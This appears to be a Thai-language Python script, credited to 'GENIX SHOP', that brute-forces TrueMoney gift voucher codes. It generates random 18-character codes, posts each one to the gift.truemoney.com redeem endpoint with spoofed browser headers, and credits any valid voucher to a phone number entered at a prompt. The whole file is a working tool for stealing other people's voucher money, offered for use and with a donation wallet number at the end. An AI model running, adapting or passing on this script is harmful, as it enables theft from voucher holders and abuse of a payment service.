# A B C แต่ไม่มี D อะไรเลย (เหี้ยไรวะ555)
from requests import Session
from random import sample
import threading
from json import load
from os import system
from threading import Thread


system('clear');


lower = 'abcdefghijklmnopqrstuvwxyz'
upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
num = '0123456789'

all = lower + upper + num

print('      คำเตือน : สคริปต์นี้ไม่สามารถใช้เน็ต vpn ได้เนื่องจาก API นี้ของไทย\n')
no = input('เบอร์ที่จะรับเงิน : ')
jam = int(input('จำนวนที่จะสุ่ม: '))
print('\n')

def getmoney(mobile):
	vouchers = ''.join(sample(all,18))
	bot = Session()
	res = bot.post(f"https://gift.truemoney.com/campaign/vouchers/{vouchers}/redeem",json={"mobile": mobile,"voucher_hash": vouchers},headers={"Accept": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36","Content-Type": "application/json","Origin": "https://gift.truemoney.com","Accept-Language": "en-US,en;q=0.9","Connection": "keep-alive"})
	print(res)
	if res.status_code == 200:
		print(f'     \x1b[32m[+] https://gift.truemoney.com/campaign/?v={vouchers} | Done !!')
	elif res.status_code == 403:
		print(f'     \x1b[31m[?] Internet has vpn !!!')
	else:
		print(f'     \x1b[31m[-] https://gift.truemoney.com/campaign/?v={vouchers} | Not Found !!')
		
for i in range(jam):
	threading.Thread(target=getmoney(no)).start()
	
print('\x1b[00m')



# donate for author (wallet. 0958816629)
# Coding GENIX SHOP | auto gift truewallet